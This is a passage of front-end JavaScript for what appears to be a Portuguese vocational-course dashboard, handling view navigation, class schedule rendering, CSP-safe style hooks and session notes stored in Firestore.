        let currentSessionKey   = null;  // "ucCode_date" for active session detail
        let currentMonthIndex   = 0;
        let notesTimer          = null;
        let sessionNotesTimer   = null;
        let materialsCache      = {};   // key → array (ucCode or session key)
        let scheduleFilter      = '';
        let scheduleViewMode    = 'cards';
        let disciplinesViewMode = 'cards';

        // Chat state
        let chatUnsub    = null;   // global chat listener unsubscribe
        let ucChatUnsub  = null;   // UC chat listener unsubscribe
        let chatWAUnsub  = null;   // WhatsApp chat listener unsubscribe
        let chatLastRead = parseInt(localStorage.getItem('chat_last_read') || '0');

        // ── DOM REFS ────────────────────────────────────────────────────
        const monthSelect          = document.getElementById('month-select');
        const monthSelectContainer = document.getElementById('month-selector-container');
        const scheduleGrid         = document.getElementById('schedule-grid');
        const scheduleTitle        = document.getElementById('schedule-title');

        // ── AULA STATE ──────────────────────────────────────────────────
        function getAulaState(diaData, horaStr) {
            const now   = new Date();
            const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
            const parts = diaData.split('-').map(Number);
            const diaDay = new Date(parts[0], parts[1] - 1, parts[2]);

            if (diaDay < today) return 'past';
            if (diaDay > today) return 'future';

            const [startStr, endStr] = horaStr.split('-');
            const [sh, sm] = startStr.split(':').map(Number);
            const [eh, em] = endStr.split(':').map(Number);
            const cur   = now.getHours() * 60 + now.getMinutes();
            const start = sh * 60 + sm;
            const end   = eh * 60 + em;

            if (cur >= end) return 'past';
            if (cur >= start) return 'current';
            return 'future';
        }


        // ── VIEW SWITCHING ──────────────────────────────────────────────
        const ALL_VIEWS = ['dashboard','horario','disciplinas','turma','uc-detail','session-detail','playground','chat','lab','cheatsheets','materiais','materiais-item','cybermap','definicoes'];

        function switchView(view) {
            if (currentView === 'definicoes' && view !== 'definicoes') {
                if (typeof unsubscribeInvites === 'function') unsubscribeInvites();
            }
            // Sidebar/main-view navigation resets the stack
            if (view !== 'uc-detail' && view !== 'session-detail') navStack = [];
            ALL_VIEWS.forEach(v => {
                const el = document.getElementById('view-' + v);
                if (el) el.style.display = 'none';
            });

            if (view === 'dashboard') {
                document.getElementById('view-dashboard').style.display = 'block';
                monthSelectContainer.style.display = 'none';
            } else if (view === 'horario') {
                document.getElementById('view-horario').style.display = 'block';
                monthSelectContainer.style.display = 'none';
                setTimeout(scrollToToday, 100);
            } else if (view === 'disciplinas') {
                document.getElementById('view-disciplinas').style.display = 'block';
                monthSelectContainer.style.display = 'none';
                renderDisciplines();
            } else if (view === 'turma') {
                document.getElementById('view-turma').style.display = 'block';
                monthSelectContainer.style.display = 'none';
                renderTurmaView();
            } else if (view === 'uc-detail') {
                document.getElementById('view-uc-detail').style.display = 'block';
                monthSelectContainer.style.display = 'none';
            } else if (view === 'session-detail') {
                document.getElementById('view-session-detail').style.display = 'block';
                monthSelectContainer.style.display = 'none';
            } else if (view === 'playground') {
                document.getElementById('view-playground').style.display = 'flex';
                monthSelectContainer.style.display = 'none';
                const active = document.querySelector('.pg-repl-input');
                if (active) setTimeout(() => active.focus(), 50);
            } else if (view === 'chat') {
                document.getElementById('view-chat').style.display = 'flex';
                monthSelectContainer.style.display = 'none';
                chatViewInit();
                chatMarkRead();
                setTimeout(() => { const el = document.getElementById('chat-view-msgs'); if (el) el.scrollTop = el.scrollHeight; }, 0);
            } else if (view === 'lab') {
                document.getElementById('view-lab').style.display = 'block';
                monthSelectContainer.style.display = 'none';
                labRender();
            } else if (view === 'cheatsheets') {
                document.getElementById('view-cheatsheets').style.display = 'flex';
                monthSelectContainer.style.display = 'none';
                if (!_csShadow) csSwitch('python');
            } else if (view === 'materiais') {
                document.getElementById('view-materiais').style.display = 'block';
                monthSelectContainer.style.display = 'none';
                skillsRenderCats();
            } else if (view === 'materiais-item') {
                document.getElementById('view-materiais-item').style.display = 'flex';
                monthSelectContainer.style.display = 'none';
            } else if (view === 'cybermap') {
                document.getElementById('view-cybermap').style.display = 'block';
                monthSelectContainer.style.display = 'none';
            } else if (view === 'definicoes') {
                document.getElementById('view-definicoes').style.display = 'block';
                monthSelectContainer.style.display = 'none';
                settingsUpdateUser();
                if (window._isModerador) {
                    document.getElementById('invite-section').style.display = 'block';
                    loadInvites();
                }
            }

            currentView = view;
            navSidebarClose();
            mobMoreClose();

            // Sync sidebar + mobile bottom nav active state
            const navKey = (view === 'uc-detail' || view === 'session-detail') ? (navStack[0] || 'dashboard')
                : (view === 'materiais-item') ? 'materiais'
                : view;
            document.querySelectorAll('.nav-item[data-view]').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.view === navKey);
            });
            document.querySelectorAll('.mob-nav-btn[data-view]').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.view === navKey);
            });
            // Highlight "Mais" button if current view is a secondary one
            const moreBtn = document.getElementById('mob-more-btn');
            const moreViews = ['disciplinas','playground','cybermap','definicoes'];
            if (moreBtn) moreBtn.classList.toggle('active', moreViews.includes(navKey));
            // Sync "Mais" menu items active state
            document.querySelectorAll('.mob-more-item[data-view]').forEach(btn => {
                btn.classList.toggle('active', btn.dataset.view === navKey);
            });
        }

        function goBackFromDetail() {
            if (ucChatUnsub) { ucChatUnsub(); ucChatUnsub = null; }
            const prev = navStack.pop() || 'dashboard';
            switchView(prev);
        }

        function goBackFromSession() {
            const prev = navStack.pop() || 'uc-detail';
            switchView(prev);
        }

        // ── MOBILE SIDEBAR ──────────────────────────────────────────────
        function navSidebarOpen() {
            document.getElementById('nav-sidebar').classList.add('open');
            document.getElementById('nav-sidebar-overlay').classList.add('visible');
        }
        function navSidebarClose() {
            document.getElementById('nav-sidebar')?.classList.remove('open');
            document.getElementById('nav-sidebar-overlay')?.classList.remove('visible');
        }

        // ── MOBILE MORE MENU ─────────────────────────────────────────────
        function mobMoreToggle() {
            const menu = document.getElementById('mob-more-menu');
            const overlay = document.getElementById('mob-more-overlay');
            const isOpen = menu.classList.contains('open');
            if (isOpen) { menu.classList.remove('open'); overlay.classList.remove('visible'); }
            else        { menu.classList.add('open');    overlay.classList.add('visible'); }
        }
        function mobMoreClose() {
            document.getElementById('mob-more-menu')?.classList.remove('open');
            document.getElementById('mob-more-overlay')?.classList.remove('visible');
        }


        // ── STYLE HOOKS (CSP: sem 'unsafe-inline' em style-src) ───────────
        // O HTML gerado dinamicamente por template strings NUNCA usa o
        // atributo style="" — em vez disso marca os elementos com classes
        // "jshook-*" (puramente seletores, não são regras CSS) e/ou
        // atributos data-*, e o estilo real é aplicado aqui via
        // elemento.style.propriedade, que é uma chamada à API DOM e não
        // uma injeção de atributo HTML. Chamar applyDeferredStyles(root)
        // depois de qualquer atribuição a innerHTML que possa conter
        // elementos marcados. Partilhado por vários módulos do dashboard
        // (horário, disciplinas, materiais, turma, chat, convites, lab) —
        // vive aqui porque horario.js é o primeiro destes ficheiros na
        // ordem de concatenação do gerador (js_files), mas fica disponível
        // globalmente após a concatenação de todos os templates/js/*.js.
        function applyStyleHooks(root) {
            if (!root) return;
            const set = (sel, styles) => root.querySelectorAll(sel).forEach(el => Object.assign(el.style, styles));

            // Horário / aulas
            set('.jshook-aula-badges-row',    { display: 'flex', gap: '0.5rem', flexWrap: 'wrap', marginTop: '5px', alignItems: 'center' });
            set('.jshook-aula-badge',         { marginTop: '0' });
            set('.jshook-aula-badge-formador',{ background: 'rgba(255,255,255,0.1)', color: '#fff' });
            set('.jshook-week-badge',         { fontSize: '0.62rem', padding: '0.1rem 0.4rem', marginTop: '3px', display: 'inline-block' });
            set('.jshook-grid-span-all',      { gridColumn: '1/-1' });

            // Materiais (vídeo/youtube)
            set('.jshook-yt-embed',    { width: '100%', aspectRatio: '16/9', display: 'block' });
            set('.jshook-local-video', { width: '100%', maxHeight: '360px', display: 'block' });

            // Turma
            set('.jshook-muted-sm',        { color: 'var(--text-secondary)', fontSize: '0.82rem' });
            set('.jshook-muted-xs',        { color: 'var(--text-secondary)', fontSize: '0.8rem' });
            set('.jshook-muted',           { color: 'var(--text-secondary)' });
            set('.jshook-cursor-pointer',  { cursor: 'pointer' });
            set('.jshook-avatar-img',      { width: '38px', height: '38px', borderRadius: '50%', objectFit: 'cover' });
            set('.jshook-avatar-fallback', { width: '38px', height: '38px', borderRadius: '50%', background: 'var(--gradient-accent)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '0.75rem', fontWeight: '700', color: '#000', flexShrink: '0' });
            set('.jshook-turma-row',       { display: 'flex', alignItems: 'center', gap: '0.85rem', padding: '0.7rem 1rem', background: 'var(--surface-color)', borderRadius: '10px' });
            set('.jshook-flex1-minw0',     { flex: '1', minWidth: '0' });
            set('.jshook-turma-name',      { fontWeight: '600', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' });
            set('.jshook-tu-tag',          { fontSize: '0.7rem', opacity: '0.7' });
            set('.jshook-last-seen',       { fontSize: '0.72rem', color: 'var(--text-secondary)', marginTop: '0.1rem' });

            // Chat
            set('.jshook-chat-time-row', { display: 'flex', gap: '0.25rem', alignItems: 'center' });
            set('.jshook-wa-badge',      { fontSize: '0.7em', opacity: '0.6', marginLeft: '0.25rem' });

            // Convites
            set('.jshook-flex-gap4-center', { display: 'flex', gap: '0.4rem', alignItems: 'center' });
            set('.jshook-uses-count',       { fontSize: '0.68rem', color: 'var(--text-secondary)' });
            set('.jshook-qr-wrap',          { display: 'none', marginTop: '0.8rem' });

            // Lab / PentestLab
            set('.jshook-xp-max-suffix',   { fontSize: '0.9rem', opacity: '0.6' });
            set('.jshook-mt-1_5rem',       { marginTop: '1.5rem' });
            set('.jshook-mt-1rem',         { marginTop: '1rem' });
            set('.jshook-fw700',           { fontWeight: '700' });
            set('.jshook-ctf-solved-sub',  { fontSize: '0.78rem', opacity: '0.8', marginTop: '0.2rem' });
            set('.jshook-arena-intro',     { marginBottom: '1rem', fontSize: '0.8rem', color: 'var(--text-secondary)' });
            set('.jshook-arena-card-desc', { fontSize: '0.75rem', color: 'var(--text-secondary)', marginBottom: '0.75rem' });
            set('.jshook-arena-input',     { marginBottom: '0.5rem', fontSize: '0.75rem' });
            set('.jshook-success-text',    { color: 'var(--success-color)' });
        }

        // Estilos cuja propriedade depende de um valor calculado em runtime
        // (percentagens, cores condicionais). O valor já calculado vai num
        // atributo data-* no HTML (nunca em style=""), e aqui é lido e
        // aplicado via elemento.style.propriedade.
        function applyDynamicStyles(root) {
            if (!root) return;
            root.querySelectorAll('[data-pct]').forEach(el => {
                el.style.width = el.dataset.pct + '%';
            });
            root.querySelectorAll('[data-accent-border]').forEach(el => {
                el.style.border = '1px solid ' + (el.dataset.accentBorder === '1' ? 'var(--accent-color)' : 'var(--border-color)');
            });
            root.querySelectorAll('[data-accent-text]').forEach(el => {
                el.style.color = el.dataset.accentText === '1' ? 'var(--accent-color)' : '#fff';
            });
            root.querySelectorAll('[data-hide-if-filtered]').forEach(el => {
                if (el.dataset.hideIfFiltered === '1') el.style.display = 'none';
            });
        }

        function applyDeferredStyles(root) {
            applyStyleHooks(root);
            applyDynamicStyles(root);
        }

        // frame.srcdoc cria um mini-documento (about:srcdoc) que herda a CSP
        // do documento principal — por isso também não pode ter style="" no
        // seu HTML. Em vez disso o corpo é marcado com um id e, assim que o
        // iframe termina de carregar, o estilo é aplicado via
        // contentDocument.<elemento>.style.propriedade (API DOM).
        function styleSrcdocOnLoad(frame, styleFn) {
            const handler = () => {
                frame.removeEventListener('load', handler);
                try { styleFn(frame.contentDocument); } catch (e) { /* cross-doc not ready */ }
            };
            frame.addEventListener('load', handler);
        }

        // Datas em que TODAS as aulas são remotas (exceções pontuais)
        const REMOTE_DATE_EXCEPTIONS = new Set(['2026-06-12', '2026-06-17']);

        // ── MERGE TIME SLOTS ────────────────────────────────────────────
        function mergeTimeSlots(aulas) {
            if (!aulas || aulas.length === 0) return [];
            let merged = [];
            let currentUc = aulas[0].uc;
            let currentModalidade = aulas[0].modalidade;
            let currentTipo = aulas[0].tipo;
            let parts = aulas[0].hora.split('-');
            let start = parts[0], end = parts[1];

            for (let i = 1; i < aulas.length; i++) {
                let p = aulas[i].hora.split('-');
                if (aulas[i].uc === currentUc && aulas[i].modalidade === currentModalidade &&
                    aulas[i].tipo === currentTipo && p[0] === end) {
                    end = p[1];
                } else {
                    merged.push({ hora: `${start}-${end}`, uc: currentUc, modalidade: currentModalidade, tipo: currentTipo });
                    currentUc = aulas[i].uc; currentModalidade = aulas[i].modalidade; currentTipo = aulas[i].tipo;
                    start = p[0]; end = p[1];
                }
            }
            merged.push({ hora: `${start}-${end}`, uc: currentUc, modalidade: currentModalidade, tipo: currentTipo });

            return merged.map(item => ({
                ...item,
                descricao: (UC_MAP[item.uc] && UC_MAP[item.uc].descricao) || item.uc,
                formador:  (UC_MAP[item.uc] && UC_MAP[item.uc].formador)  || ''
            }));
        }

        // ── RENDER CRONOGRAMA ───────────────────────────────────────────
        // (kept for data availability; UI elements may not exist in this layout)
        function renderCronograma() {
            const cronoGeralEl  = document.getElementById('crono-geral');
            const cronoResumoEl = document.getElementById('crono-resumo');
            if (!cronoGeralEl) return;
            if (!CRONOGRAMA.data_inicio) {
                cronoGeralEl.innerHTML = `<li><span class="info-label">Dados do</span><span class="info-val">Cronograma Indisponível</span></li>`;
                return;
            }
            cronoGeralEl.innerHTML = `
                ${CRONOGRAMA.designacao ? `<li><span class="info-label">Curso</span><span class="info-val">${escapeHtml(CRONOGRAMA.designacao)}</span></li>` : ''}
                ${CRONOGRAMA.instituicao ? `<li><span class="info-label">Instituição</span><span class="info-val">${escapeHtml(CRONOGRAMA.instituicao)}</span></li>` : ''}
                ${CRONOGRAMA.responsavel_acao ? `<li><span class="info-label">Responsável</span><span class="info-val">${escapeHtml(CRONOGRAMA.responsavel_acao)}</span></li>` : ''}
                <li><span class="info-label">Período</span><span class="info-val">${escapeHtml(CRONOGRAMA.data_inicio)} a ${escapeHtml(CRONOGRAMA.data_fim)}</span></li>
                <li><span class="info-label">Local</span><span class="info-val">${escapeHtml(CRONOGRAMA.local)} • Sala ${escapeHtml(CRONOGRAMA.sala)}</span></li>
                <li><span class="info-label">Horário Base</span><span class="info-val">${escapeHtml(CRONOGRAMA.horario)}</span></li>
                <li><span class="info-label">Carga Horária</span><span class="info-val">${CRONOGRAMA.carga_horaria.total}h Total (FCT: ${CRONOGRAMA.carga_horaria.fct}h)</span></li>
            `;
            if (CRONOGRAMA.resumo_mensal && cronoResumoEl) {
                cronoResumoEl.innerHTML = CRONOGRAMA.resumo_mensal.map(r => `
                    <div class="resumo-row">
                        <div>${escapeHtml(r.mes)}</div>
                        <div>${r.dias} dias</div>
                        <div>${r.horas_mes}h / ${r.horas_totais}h</div>
                    </div>
                `).join('');
            }
        }

        function highlightCurrentMonth(monthName) {
            if (!CRONOGRAMA.resumo_mensal) return;
            const cronoResumoEl = document.getElementById('crono-resumo');
            if (!cronoResumoEl) return;
            const cleanMonth = monthName.split(' ')[0].substring(0, 3).toLowerCase();
            cronoResumoEl.querySelectorAll('.resumo-row').forEach(row => {
                row.classList.remove('highlight');
                if (row.children[0].innerText.toLowerCase().includes(cleanMonth)) {
                    row.classList.add('highlight');
                }
            });
        }

        // ── RENDER HORÁRIO ──────────────────────────────────────────────
        function renderHorario() {
            scheduleTitle.innerText = 'Horário';
            const now = new Date();
            const monthNames = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
            highlightCurrentMonth(monthNames[now.getMonth()]);
            if (scheduleViewMode === 'week') {
                renderHorarioWeekAll(scheduleFilter);
            } else {
                renderHorarioCardsAll(scheduleFilter);
            }
        }

        function aulaMatchesFilter(aula, filter) {
            if (!filter) return true;
            const q = filter.toLowerCase();
            return (aula.uc        || '').toLowerCase().includes(q) ||
                   (aula.descricao || '').toLowerCase().includes(q) ||
                   (aula.formador  || '').toLowerCase().includes(q);
        }

        function buildAulaCardHtml(aula, state, matched, diaData) {
            const isClickable   = UC_MAP[aula.uc] ? 'clickable' : '';
            const dimClass      = (scheduleFilter && !matched) ? 'filtered-out' : '';
            const isRemote      = aula.modalidade === 'remoto' || (aula.uc === 'UC00602') || (UC_MAP[aula.uc] && UC_MAP[aula.uc].modalidade === 'remoto') || REMOTE_DATE_EXCEPTIONS.has(diaData);
            const remoteClass   = isRemote ? 'remote' : '';
            const remoteBadge   = isRemote
                ? `<div class="aula-uc badge remote jshook-aula-badge">🌐 Remoto</div>` : '';
            const isTeste       = aula.tipo === 'teste';
            const testeClass    = isTeste ? 'teste' : '';
            const testeBadge    = isTeste
                ? `<div class="aula-uc badge teste jshook-aula-badge">📝 Teste</div>` : '';
            const formadorBadge = aula.formador
                ? `<div class="aula-uc badge jshook-aula-badge jshook-aula-badge-formador">👤 ${shortName(aula.formador)}</div>` : '';
            const clickAttr = UC_MAP[aula.uc]
                ? `data-uc-sched="${aula.uc}"` : '';
            return `
            <div class="aula-card ${state} ${isClickable} ${remoteClass} ${testeClass} ${dimClass}" ${clickAttr}>
                <div class="aula-time">${aula.hora}</div>
                <div class="aula-info">
                    <div class="aula-desc">${aula.descricao}</div>
                    <div class="jshook-aula-badges-row">
                        <div class="aula-uc badge jshook-aula-badge">${aula.uc}</div>
                        ${remoteBadge}${testeBadge}${formadorBadge}
                    </div>
                </div>
                ${UC_MAP[aula.uc] ? `<button class="open-uc-btn" title="Abrir disciplina">↗</button>` : ''}
            </div>`;
        }

        function renderHorarioCardsAll(filter) {
            scheduleGrid.className = 'schedule-grid';
            const cap = s => s.charAt(0).toUpperCase() + s.slice(1);
            const pad = n => String(n).padStart(2, '0');
            const DOW_PT = ['DOM', 'SEG', 'TER', 'QUA', 'QUI', 'SEX', 'SAB'];
            const parseDate = s => { const [y,m,d] = s.split('-').map(Number); return new Date(y, m-1, d); };

            // Flatten all days from all months, sorted by date
            const flat = [];
            HORARIOS.forEach(h => h.dias.forEach(d => flat.push({ mes_ano: h.mes_ano, ...d })));
            flat.sort((a, b) => a.data.localeCompare(b.data));

            // Insert weekend days into cross-month gaps
            const days = [];
            flat.forEach((entry, i) => {
                days.push(entry);
                if (i < flat.length - 1) {
                    const next = flat[i + 1];
                    const d1 = parseDate(entry.data), d2 = parseDate(next.data);
                    for (const d = new Date(d1); ; ) {
                        d.setDate(d.getDate() + 1);
                        if (d >= d2) break;
                        const dow = d.getDay();
                        if (dow === 0 || dow === 6) {
                            const ds = `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}`;
                            days.push({ mes_ano: entry.mes_ano, data: ds, dia_semana: DOW_PT[dow], aulas: [], nota: 'Fim de semana', isWeekend: true });
                        }
                    }
                }
            });

            // Group by month and render with separators
            let html = '';
            let lastMonth = null;
            let monthHtml = '';
            let monthHasContent = false;

            const flushMonth = () => {
                if (lastMonth !== null && (!filter || monthHasContent)) {
                    html += monthHtml;
                }
                monthHtml = ''; monthHasContent = false;
            };

            days.forEach(dia => {
                if (dia.mes_ano !== lastMonth) { flushMonth(); lastMonth = dia.mes_ano; }
                if (dia.isWeekend && filter) return;

                const mergedAulas = mergeTimeSlots(dia.aulas);
                let aulasHtml = '';
                let dayMatches = false;

                if (mergedAulas.length > 0) {
                    mergedAulas.forEach(aula => {
                        const matched = aulaMatchesFilter(aula, filter);
                        if (matched) dayMatches = true;
                        aulasHtml += buildAulaCardHtml(aula, getAulaState(dia.data, aula.hora), matched, dia.data);
                    });
                } else if (dia.nota) {
                    dayMatches = !filter;
                    const cls = dia.isWeekend ? 'weekend-card' : 'holiday';
                    aulasHtml = `<div class="aula-card empty-card ${cls}"><div class="aula-info"><div class="aula-desc">${dia.nota}</div></div></div>`;
                } else {
                    dayMatches = !filter;
                    aulasHtml = `<div class="aula-card empty-card"><div class="aula-info"><div class="aula-desc">Sem aulas programadas</div></div></div>`;
                }

                if (!filter || dayMatches) monthHasContent = true;
                monthHtml += `
                <div class="day-card${dia.isWeekend ? ' weekend-day' : ''}" data-date="${dia.data}" data-hide-if-filtered="${(filter && !dayMatches) ? '1' : '0'}">
                    <div class="day-header">
                        <span class="day-date">${dia.data}</span>
                        <span class="day-week badge">${dia.dia_semana}</span>
                    </div>
                    <div class="day-body">${aulasHtml}</div>
                </div>`;
            });
            flushMonth();

            scheduleGrid.innerHTML = html || `<div class="empty-state jshook-grid-span-all">Nenhuma aula encontrada para esse filtro.</div>`;
            scheduleGrid.querySelectorAll('[data-uc-sched]').forEach(el =>
                el.addEventListener('click', () => openUCFromSchedule(el.dataset.ucSched))
            );
            applyDeferredStyles(scheduleGrid);
            setTimeout(scrollToToday, 60);
        }

        function getWeekStart(dateStr) {
            const [y, m, d] = dateStr.split('-').map(Number);
            const dt  = new Date(y, m - 1, d);
            const dow = dt.getDay(); // 0=Sun
            dt.setDate(dt.getDate() + (dow === 0 ? -6 : 1 - dow));
            const pad = n => String(n).padStart(2, '0');
            return `${dt.getFullYear()}-${pad(dt.getMonth()+1)}-${pad(dt.getDate())}`;
        }

        function renderHorarioWeekAll(filter) {
            scheduleGrid.className = 'schedule-grid week-view';
            const pad = n => String(n).padStart(2, '0');
            const now = new Date();
            const todayStr = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}`;
            const DAY_NAMES = ['Seg', 'Ter', 'Qua', 'Qui', 'Sex'];

            // Collect all days across all months, preserving mes_ano
            const allDays = {};
            const dayMonth = {};
            HORARIOS.forEach(horario => {
                horario.dias.forEach(dia => {
                    allDays[dia.data] = dia;
                    dayMonth[dia.data] = horario.mes_ano;
                });
            });

            // Group by week
            const byWeek = {};
            Object.keys(allDays).sort().forEach(dateStr => {
                const wk = getWeekStart(dateStr);
                if (!byWeek[wk]) byWeek[wk] = {};
                byWeek[wk][dateStr] = allDays[dateStr];
            });

            let lastMonth = null;
            const weeksHtml = Object.keys(byWeek).sort().map(weekStart => {
                const [wy, wm, wd] = weekStart.split('-').map(Number);
                const monDate = new Date(wy, wm - 1, wd);

                // Detect month change based on first day of this week that has data
                const firstDayOfWeek = Object.keys(byWeek[weekStart]).sort()[0];
                const weekMonth = dayMonth[firstDayOfWeek];
                if (weekMonth) lastMonth = weekMonth;

                const colsHtml = DAY_NAMES.map((dayName, i) => {
                    const dt = new Date(monDate);
                    dt.setDate(monDate.getDate() + i);
                    const dateStr = `${dt.getFullYear()}-${pad(dt.getMonth()+1)}-${pad(dt.getDate())}`;
                    const dia     = (byWeek[weekStart] || {})[dateStr];
                    const isToday = dateStr === todayStr;
                    const header  = `<div class="week-day-header">
                        <span class="week-day-name">${dayName}</span>
                        <span class="week-day-date">${pad(dt.getDate())}/${pad(dt.getMonth()+1)}</span>
                    </div>`;

                    if (!dia) {
                        return `<div class="week-day-col no-class${isToday ? ' today' : ''}">${header}<div class="week-day-body"></div></div>`;
                    }

                    const mergedAulas = mergeTimeSlots(dia.aulas);
                    let bodyHtml = '';
                    let colMatches = false;

                    if (mergedAulas.length > 0) {
                        mergedAulas.forEach(aula => {
                            const matched    = aulaMatchesFilter(aula, filter);
                            if (matched) colMatches = true;
                            const state      = getAulaState(dia.data, aula.hora);
                            const dimCls     = (filter && !matched) ? 'filtered-out' : '';
                            const clickCls   = UC_MAP[aula.uc] ? 'clickable' : '';
                            const clickAttr  = UC_MAP[aula.uc] ? `data-uc-sched="${aula.uc}"` : '';
                            const isRemote   = aula.modalidade === 'remoto' || (aula.uc === 'UC00602') || (UC_MAP[aula.uc] && UC_MAP[aula.uc].modalidade === 'remoto') || REMOTE_DATE_EXCEPTIONS.has(dia.data);
                            const remoteCls  = isRemote ? 'remote' : '';
                            const remoteBadge = isRemote ? `<span class="badge remote jshook-week-badge">🌐 Remoto</span>` : '';
                            const isTeste    = aula.tipo === 'teste';
                            const testeCls   = isTeste ? 'teste' : '';
                            const testeBadge = isTeste ? `<span class="badge teste jshook-week-badge">📝 Teste</span>` : '';
                            bodyHtml += `
                            <div class="week-aula-card ${state} ${clickCls} ${remoteCls} ${testeCls} ${dimCls}" ${clickAttr}>
                                <div class="week-aula-time">${aula.hora}</div>
                                <div class="week-aula-desc">${aula.descricao}</div>
                                <div class="week-aula-uc">${aula.uc}${remoteBadge}${testeBadge}</div>
                            </div>`;
                        });
                    } else if (dia.nota) {
                        colMatches = !filter;
                        bodyHtml = `<div class="week-aula-card holiday"><div class="week-aula-desc">${dia.nota}</div></div>`;
                    }

                    const hideCls = (filter && mergedAulas.length > 0 && !colMatches) ? ' col-hidden' : '';
                    return `<div class="week-day-col${isToday ? ' today' : ''}${hideCls}" data-date="${dateStr}">
                        ${header}<div class="week-day-body">${bodyHtml}</div>
                    </div>`;
                }).join('');

                const friDate = new Date(monDate);
                friDate.setDate(monDate.getDate() + 4);
                const weekLabel = `${pad(monDate.getDate())}–${pad(friDate.getDate())}/${pad(monDate.getMonth()+1)}`;

                return `<div class="week-block">
                    <div class="week-label">${weekLabel}</div>
                    <div class="week-days">${colsHtml}</div>
                </div>`;
            }).join('');

            scheduleGrid.innerHTML = weeksHtml || '<div class="empty-state">Nenhuma aula encontrada.</div>';
            scheduleGrid.querySelectorAll('[data-uc-sched]').forEach(el =>
                el.addEventListener('click', () => openUCFromSchedule(el.dataset.ucSched))
            );
            applyDeferredStyles(scheduleGrid);
            setTimeout(scrollToToday, 60);
        }

        function findNearestMonthIndex() {
            const pad = n => String(n).padStart(2, '0');
            const now = new Date();
            const todayStr = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}`;
            // 1. Exact match for today
            let idx = HORARIOS.findIndex(h => h.dias.some(d => d.data === todayStr));
            if (idx !== -1) return idx;
            // 2. Month with the next upcoming session day
            idx = HORARIOS.findIndex(h => h.dias.some(d => d.data >= todayStr));
            if (idx !== -1) return idx;
            // 3. Last month available
            return HORARIOS.length - 1;
        }

        function scrollToToday() {
            const pad = n => String(n).padStart(2, '0');
            const now = new Date();
            const todayStr = `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())}`;
            const toolbar  = document.querySelector('.schedule-toolbar');
            const offset   = (toolbar?.offsetHeight || 80) + 16;
            const content  = document.getElementById('app-content');

            // Try exact today, then first upcoming day, then last rendered card
            const allDayCards = [...document.querySelectorAll('.day-card[data-date], .week-day-col[data-date]')];
            const target = allDayCards.find(el => el.dataset.date === todayStr)
                        || allDayCards.find(el => el.dataset.date > todayStr)
                        || allDayCards[allDayCards.length - 1];

            if (!target || !content) return;
            const targetRect  = target.getBoundingClientRect();
            const contentRect = content.getBoundingClientRect();
            content.scrollTo({ top: content.scrollTop + targetRect.top - contentRect.top - offset, behavior: 'smooth' });
        }

        function openUCFromSchedule(ucCode) {
            navStack.push(currentView);
            openUCDetail(ucCode);
        }

        async function openSessionDetail(ucCode, date, num, hora, diaSemana, mesAno) {
            // S1 reuses the original UC key so existing notes/materials are preserved
            const key = num === 1 ? ucCode : `${ucCode}_${date}`;
            currentSessionKey = key;

            const uc = UC_MAP[ucCode] || {};
            const [y, mo, d] = date.split('-');

            document.getElementById('session-detail-num').textContent  = `S${num} · ${ucCode}`;
            document.getElementById('session-detail-uc-name').textContent = uc.descricao || ucCode;
            document.getElementById('session-detail-meta').innerHTML =
                `<span class="detail-meta-pill">📅 ${d}/${mo} ${diaSemana}</span>` +
                `<span class="detail-meta-pill">🕐 ${hora}</span>`;

            // Populate sticky session nav strip with all sessions of this UC
            const sessions = buildUCSchedule(ucCode);
            let sNum = 1;
            sessions.forEach(s => { s.num = sNum++; });
            const navChips = document.getElementById('session-nav-chips');
            navChips.innerHTML = buildSessionChipsHTML(ucCode, sessions, key);
            navChips.querySelectorAll('[data-sess-uc]').forEach(el =>
                el.addEventListener('click', () => openSessionDetail(
                    el.dataset.sessUc, el.dataset.sessDate, parseInt(el.dataset.sessNum),
                    el.dataset.sessHora, el.dataset.sessDow, el.dataset.sessMes
                ))
            );

            // Reset notes & materials UI before switching view
            const ta = document.getElementById('session-notes-textarea');
            ta.value = '';
            ta.oninput = () => autoSaveSessionNote(key, ta.value);
            ta.onpaste = (e) => handleNotesPaste(e);
            document.getElementById('session-notes-saved').classList.remove('visible');
            switchNotesTab('edit');
            document.getElementById('session-materials-list').innerHTML =
                '<div class="no-materials">⏳ A carregar...</div>';

            // Switch view immediately — don't block on async Firestore calls
            switchView('session-detail');

            // Load notes + materials in parallel
            const uid = auth.currentUser?.uid;
            const [notesResult, matList] = await Promise.allSettled([
                loadSessionNote(uid, key),
                getSessionMaterials(key)
            ]);

            if (notesResult.status === 'fulfilled' && notesResult.value) {
                ta.value = notesResult.value;
            }
            if (matList.status === 'fulfilled') {
                renderSessionMaterials(key, matList.value);
            }
        }

        async function loadSessionNote(uid, key) {
            if (!uid) return '';
            try {
                const doc = await db.collection('notes').doc(`${uid}_${key}`).get();
                return doc.exists ? (doc.data().content || '') : '';
            } catch(e) { return ''; }
        }

        function switchNotesTab(tab) {
            const editPane    = document.querySelector('.notes-edit-pane');
            const previewPane = document.getElementById('notes-preview-pane');
            const tabEdit     = document.getElementById('notes-tab-edit');
            const tabPreview  = document.getElementById('notes-tab-preview');
            if (!editPane || !previewPane) return;
            if (tab === 'preview') {
                editPane.style.display = 'none';
                previewPane.style.display = 'block';
                tabEdit.classList.remove('active');
                tabPreview.classList.add('active');
                renderNotesPreview();
            } else {
                editPane.style.display = '';
                previewPane.style.display = 'none';
                tabEdit.classList.add('active');
                tabPreview.classList.remove('active');
            }
        }

        function renderNotesPreview() {
            const ta      = document.getElementById('session-notes-textarea');
            const preview = document.getElementById('notes-preview-pane');
            if (!ta || !preview) return;
            const html = (typeof marked !== 'undefined')
                ? marked.parse(ta.value || '', { breaks: true, gfm: true })
                : `<pre>${escapeHtml(ta.value)}</pre>`;
            preview.innerHTML = html;
            if (typeof renderMathInElement !== 'undefined') {
                renderMathInElement(preview, {
                    delimiters: [
                        { left: '$$', right: '$$', display: true },
                        { left: '$',  right: '$',  display: false },
